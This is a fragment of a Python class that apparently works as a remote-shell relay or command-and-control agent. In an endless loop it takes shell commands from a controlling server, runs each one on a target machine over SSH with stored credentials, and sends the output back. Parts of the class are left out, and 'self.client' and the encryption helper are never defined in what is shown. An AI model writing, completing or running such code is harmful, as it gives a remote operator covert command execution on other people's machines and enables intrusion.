class T:
    def __init__(self, server_ip, server_port, key, target_machine_ip, username, password):
        self.server_ip = server_ip
        self.server_port = server_port
        self.key = key
        self.target_machine_ip = target_machine_ip
        self.username = username
        self.password = password

    # Other methods...

    def online_interaction(self):
        while True:
            print("[+] Awaiting Shell Commands...")
            user_command = self.client.recv(1024).decode()
            encrypted_message = self.encrypt_message(user_command)
            self.client.send(encrypted_message)

            # Establish SSH connection with the target machine
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_client.connect(self.target_machine_ip, username=self.username, password=self.password)

            # Execute commands on the target machine
            stdin, stdout, stderr = ssh_client.exec_command(user_command)
            output = stdout.read()
            error = stderr.read()

            print("[+] Sending Command Output...")
            if output == b"" and error == b"":
                self.client.send(b"client_msg: no visible output")
            else:
                self.client.send(output + error)

            # Close the SSH connection
            ssh_client.close()

    # Other methods...
